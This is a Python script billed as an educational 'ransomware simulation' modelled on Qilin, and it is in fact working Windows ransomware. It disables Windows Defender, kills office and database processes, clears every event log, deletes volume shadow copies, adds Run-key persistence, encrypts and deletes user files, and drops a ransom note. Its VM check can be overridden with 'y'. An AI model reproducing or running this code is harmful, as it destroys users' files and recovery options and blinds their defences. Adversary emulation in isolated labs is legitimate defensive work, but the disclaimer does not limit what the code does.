#!/usr/bin/env python3
"""
Ransomware Simulation – High-Fidelity Adversary Emulation Tool
Modeled on Qilin, but TTPs apply to LockBit, BlackCat, Conti, etc.
"""

import os
import sys
import ctypes
import winreg
import subprocess
from pathlib import Path

# ========== CHECK CRYPTOGRAPHY DEPENDENCY ==========
try:
    from cryptography.fernet import Fernet
except ImportError:
    print("[!] Missing required library: cryptography")
    print("    Install it with: pip install cryptography")
    sys.exit(1)

# ========== DISCLAIMER (printed on attack) ==========
DISCLAIMER = """
╔══════════════════════════════════════════════════════════════════╗
║  DISCLAIMER – READ BEFORE PROCEEDING                             ║
║                                                                  ║
║  This script is for EDUCATIONAL AND LEARNING PURPOSES ONLY.      ║
║  It is designed to run in an isolated, controlled lab            ║
║  environment (e.g., a disposable VM with a snapshot).            ║
║                                                                  ║
║  Do NOT run on any production system, shared network, or         ║
║  without explicit written permission.                            ║
║                                                                  ║
║  The author assumes NO LIABILITY for misuse or damage.           ║
║  You have been warned.                                           ║
╚══════════════════════════════════════════════════════════════════╝
"""

# ========== CONFIGURATION ==========
QILIN_EXTENSION = ".qilin"
RANSOM_NOTE_FILE = "README_RECOVER.txt"
BITCOIN_WALLET = "bc1qilinfakeaddress1234567890abcdefghijk"
TOR_NEGOTIATION_URL = "http://qilinchat7lvh7y7c.onion/abcdef123"

VERBOSE_SCAN = True

TARGET_FOLDERS = [
    str(Path.home() / "Desktop"),
    str(Path.home() / "Documents"),
    str(Path.home() / "Downloads"),
]

PROTECTED_NAMES = [
    RANSOM_NOTE_FILE,
    "ransomware_key.txt",
    "ransomware_simulation.py",
]

TARGET_EXTENSIONS = [
    ".txt", ".doc", ".docx", ".xls", ".xlsx", ".pdf",
    ".jpg", ".png", ".zip", ".rar", ".bak", ".backup",
]

KILL_LIST = [
    "sqlservr.exe", "outlook.exe", "excel.exe", "winword.exe",
    "onedrive.exe", "msaccess.exe", "powerpnt.exe"
]

# ========== UTILITIES ==========
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def elevate():
    print("[!] Need admin rights. Requesting elevation...")
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit(0)

def is_vm():
    try:
        out = subprocess.run('wmic computersystem get model', shell=True, capture_output=True, text=True)
        return any(x in out.stdout for x in ["VirtualBox", "VMware", "VBOX"])
    except:
        return False

# ========== DESTRUCTIVE PHASES ==========
def disable_defender():
    print("[*] Disabling Windows Defender (T1562.001)")
    subprocess.run(['reg', 'add', 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender', '/v', 'DisableAntiSpyware', '/t', 'REG_DWORD', '/d', '1', '/f'], capture_output=True)
    subprocess.run(['powershell', '-Command', 'Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue'], capture_output=True)
    print("    Defender disabled.")

def kill_processes():
    print("[*] Terminating processes (T1562.009)")
    for proc in KILL_LIST:
        subprocess.run(['taskkill', '/f', '/im', proc], capture_output=True)
        print(f"    Killed: {proc}")

def delete_shadow_copies():
    print("[*] Deleting Volume Shadow Copies (T1490)")
    subprocess.run(['vssadmin', 'delete', 'shadows', '/all', '/quiet'], capture_output=True)
    # Use PowerShell instead of deprecated wmic
    ps_cmd = "Get-WmiObject Win32_ShadowCopy | ForEach-Object { $_.Delete() }"
    subprocess.run(['powershell', '-Command', ps_cmd], capture_output=True)
    print("    Shadow copies deleted.")

def add_persistence():
    print("[*] Adding registry persistence (T1547.001)")
    script_path = os.path.abspath(__file__)
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "RansomwareBackup", 0, winreg.REG_SZ, script_path)
        winreg.CloseKey(key)
        print("    Registry Run key added.")
    except Exception as e:
        print(f"    Failed: {e}")

def clear_event_logs():
    print("[*] Clearing Windows Event Logs (T1070)")
    ps_cmd = '$logs = Get-WinEvent -ListLog * | Where-Object {$_.RecordCount} | Select-Object -ExpandProperty LogName ; ForEach ($l in $logs | Sort | Get-Unique) {[System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($l)}'
    subprocess.run(['powershell', '-Command', ps_cmd], capture_output=True)
    print("    Event logs cleared.")

# ========== ENCRYPTION ==========
def generate_key():
    return Fernet.generate_key()

def is_protected(file_path):
    name = os.path.basename(file_path)
    if name in PROTECTED_NAMES:
        return True
    if file_path.endswith(QILIN_EXTENSION):
        return True
    return False

def should_encrypt_by_extension(file_path):
    ext = os.path.splitext(file_path)[1].lower()
    return ext in TARGET_EXTENSIONS

def encrypt_one_file(file_path, cipher):
    try:
        with open(file_path, 'rb') as f:
            plain = f.read()
        encrypted = cipher.encrypt(plain)
        new_path = file_path + QILIN_EXTENSION
        with open(new_path, 'wb') as f:
            f.write(encrypted)
        os.remove(file_path)
        print(f"        [ENCRYPTED] {os.path.basename(file_path)}")
        return new_path
    except Exception as e:
        print(f"        [FAILED] {os.path.basename(file_path)}: {e}")
        return None

def find_files():
    print("\n[DEBUG] === STARTING FILE SCAN ===")
    victims = []
    script_path = os.path.abspath(__file__)
    
    for folder in TARGET_FOLDERS:
        print(f"\n[DEBUG] Scanning folder: {folder}")
        if not os.path.exists(folder):
            print(f"[DEBUG]   Folder does NOT exist - skipping")
            continue
        
        file_count = 0
        for root, dirs, files in os.walk(folder):
            if any(skip in root for skip in ["Windows", "Program Files", "System32", "AppData"]):
                continue
            
            for file in files:
                full_path = os.path.join(root, file)
                if full_path == script_path:
                    if VERBOSE_SCAN:
                        print(f"[DEBUG]   Skipping script itself: {file}")
                    continue
                if VERBOSE_SCAN:
                    print(f"[DEBUG]   Checking: {file}")
                if not should_encrypt_by_extension(full_path):
                    if VERBOSE_SCAN:
                        ext = os.path.splitext(file)[1].lower()
                        print(f"[DEBUG]     -> REJECTED: extension '{ext}' not in list")
                    continue
                if is_protected(full_path):
                    if VERBOSE_SCAN:
                        print(f"[DEBUG]     -> REJECTED: protected file")
                    continue
                if VERBOSE_SCAN:
                    print(f"[DEBUG]     -> ACCEPTED: will encrypt")
                victims.append(full_path)
                file_count += 1
        
        print(f"[DEBUG]   Found {file_count} encryptable files in {folder}")
    
    print(f"\n[DEBUG] === SCAN COMPLETE: {len(victims)} total files ===\n")
    return victims[:200]

def drop_ransom_note():
    note = f"""
    ============================================================
                      RANSOMWARE SIMULATION
              Your files have been ENCRYPTED
    ============================================================

    Send 250 BTC to: {BITCOIN_WALLET}
    Negotiate via Tor: {TOR_NEGOTIATION_URL}

    Deadline: 72 hours.
    ============================================================
    """
    path = os.path.join(str(Path.home() / "Desktop"), RANSOM_NOTE_FILE)
    with open(path, 'w') as f:
        f.write(note)
    print(f"[+] Ransom note dropped on Desktop")

def set_black_wallpaper():
    try:
        SPI_SETDESKWALLPAPER = 20
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, None, 3)
        print("[*] Wallpaper changed to black.")
    except:
        pass

# ========== ROLLBACK ==========
def rollback():
    print("\n[!!!] STARTING ROLLBACK...")
    key_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "ransomware_key.txt")
    if os.path.exists(key_file):
        with open(key_file, 'r') as f:
            key = f.read().strip()
        print("[*] Using saved encryption key.")
    else:
        key = input("[?] Enter encryption key: ").strip()
        if not key:
            print("No key provided.")
            sys.exit(1)
    
    try:
        cipher = Fernet(key.encode())
    except Exception as e:
        print(f"Invalid key: {e}")
        sys.exit(1)

    restored = 0
    for folder in TARGET_FOLDERS:
        if not os.path.exists(folder):
            continue
        for root, _, files in os.walk(folder):
            for name in files:
                if name.endswith(QILIN_EXTENSION):
                    enc_path = os.path.join(root, name)
                    orig = enc_path[:-len(QILIN_EXTENSION)]
                    try:
                        with open(enc_path, 'rb') as f:
                            enc_data = f.read()
                        dec_data = cipher.decrypt(enc_data)
                        with open(orig, 'wb') as f:
                            f.write(dec_data)
                        os.remove(enc_path)
                        restored += 1
                        print(f"    Restored: {os.path.basename(orig)}")
                    except Exception as e:
                        print(f"    Failed: {e}")
    print(f"[*] Restored {restored} files.")

    # Remove persistence
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, "RansomwareBackup")
        winreg.CloseKey(key)
        print("[-] Removed registry persistence.")
    except:
        pass

    # Delete ransom note
    note_path = os.path.join(str(Path.home() / "Desktop"), RANSOM_NOTE_FILE)
    if os.path.exists(note_path):
        os.remove(note_path)
        print("[-] Deleted ransom note.")

    # Inform about irreversible changes
    print("\n[!] Rollback complete for files and persistence.")
    print("[!] However, the following changes CANNOT be undone by this script:")
    print("    - Volume Shadow Copies (permanently deleted)")
    print("    - Windows Event Logs (cleared history is gone)")
    print("    - Windows Defender (still disabled – reboot or re-enable manually)")
    print("[!] Always use a VM snapshot for full recovery.")
    sys.exit(0)

# ========== MAIN ATTACK ==========
def attack():
    print(DISCLAIMER)
    print("\nPress Ctrl+C now to abort, or Enter to continue...")
    try:
        input()
    except KeyboardInterrupt:
        print("\n[!] Aborted by user.")
        sys.exit(0)

    print("""
    ============================================================
         RANSOMWARE SIMULATION
         ONLY IN ISOLATED VM
    ============================================================
    """)
    
    if not is_vm():
        answer = input("[!] Not in a VM. Continue? (y/N): ")
        if answer.lower() != 'y':
            sys.exit(0)
    
    if not is_admin():
        elevate()
    
    enc_key = generate_key()
    key_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "ransomware_key.txt")
    with open(key_path, 'w') as f:
        f.write(enc_key.decode())
    print(f"[*] Encryption key saved to: {key_path}")
    print("[*] KEEP THIS KEY for --rollback.\n")
    
    cipher = Fernet(enc_key)
    
    print("\n[+] PHASE 1: Defense Evasion")
    disable_defender()
    kill_processes()
    clear_event_logs()
    
    print("\n[+] PHASE 2: Disable Recovery")
    delete_shadow_copies()
    
    print("\n[+] PHASE 3: Persistence")
    add_persistence()
    
    print("\n[+] PHASE 4: File Encryption")
    files = find_files()
    if len(files) == 0:
        print("    No files found to encrypt!")
        print("    Make sure you have .txt files on your Desktop or Documents folder.")
    else:
        encrypted = 0
        for i, f in enumerate(files):
            if encrypt_one_file(f, cipher):
                encrypted += 1
            if (i + 1) % 10 == 0:
                print(f"    Progress: {i+1}/{len(files)}")
        print(f"    Encrypted {encrypted} files with {QILIN_EXTENSION}")
    
    print("\n[+] PHASE 5: Extortion")
    drop_ransom_note()
    set_black_wallpaper()
    
    print("\n" + "="*60)
    print("ATTACK COMPLETE")
    print(f"To decrypt: python {os.path.basename(__file__)} --rollback")
    print("="*60)

# ========== ENTRY POINT ==========
if __name__ == "__main__":
    print("[DEBUG] Script started")
    if len(sys.argv) > 1 and sys.argv[1] == "--rollback":
        rollback()
    elif len(sys.argv) > 1 and sys.argv[1] == "--attack":
        attack()
    else:
        print(__doc__)
        print("\nUsage:")
        print(f"  python {os.path.basename(__file__)} --attack")
        print(f"  python {os.path.basename(__file__)} --rollback")